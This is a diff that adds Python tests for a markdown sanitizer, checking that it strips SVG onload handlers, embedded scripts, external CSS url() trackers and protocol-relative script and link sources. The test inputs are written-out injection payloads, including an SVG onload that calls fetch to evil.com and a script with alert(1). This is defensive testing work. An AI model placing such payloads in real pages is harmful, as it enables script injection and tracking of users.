@@ -126,3 +126,54 @@ class TestMarkdownPrefetchRemoval:
         result = sanitize(content, mode="markdown")
         assert "preload" not in result
         assert "Text" in result
+
+
+class TestMarkdownSvgScriptRemoval:
+    """M7: SVG onload/script removed, SVG structure preserved."""
+
+    def test_svg_onload_removed(self):
+        content = '<svg onload="fetch(\'https://evil.com\')" width="100"><rect/></svg>'
+        result = sanitize(content, mode="markdown")
+        assert "onload" not in result
+        assert "evil.com" not in result
+        assert "<svg" in result
+        assert "<rect" in result
+
+    def test_svg_embedded_script_removed(self):
+        content = '<svg><script>alert(1)</script><circle r="5"/></svg>'
+        result = sanitize(content, mode="markdown")
+        assert "<script>" not in result
+        assert "alert" not in result
+        assert "<circle" in result
+
+
+class TestMarkdownStyleUrlRemoval:
+    """M8: Inline style url() pointing to external domains removed."""
+
+    def test_style_url_external_removed(self):
+        content = '<div style="background:url(https://tracker.com/pixel.gif);color:red">Text</div>'
+        result = sanitize(content, mode="markdown")
+        assert "tracker.com" not in result
+        assert "color:red" in result or "color: red" in result
+        assert "Text" in result
+
+    def test_style_url_local_preserved(self):
+        content = '<div style="background:url(images/bg.png)">Text</div>'
+        result = sanitize(content, mode="markdown")
+        assert "images/bg.png" in result
+
+
+class TestMarkdownProtocolRelativeRemoval:
+    """M9: Elements with protocol-relative URLs to external domains removed."""
+
+    def test_protocol_relative_script_removed(self):
+        content = '<script src="//cdn.tracker.com/track.js"></script>\nText'
+        result = sanitize(content, mode="markdown")
+        assert "tracker.com" not in result
+        assert "Text" in result
+
+    def test_protocol_relative_link_removed(self):
+        content = '<link rel="stylesheet" href="//fonts.googleapis.com/css">\nText'
+        result = sanitize(content, mode="markdown")
+        assert "googleapis.com" not in result
+        assert "Text" in result
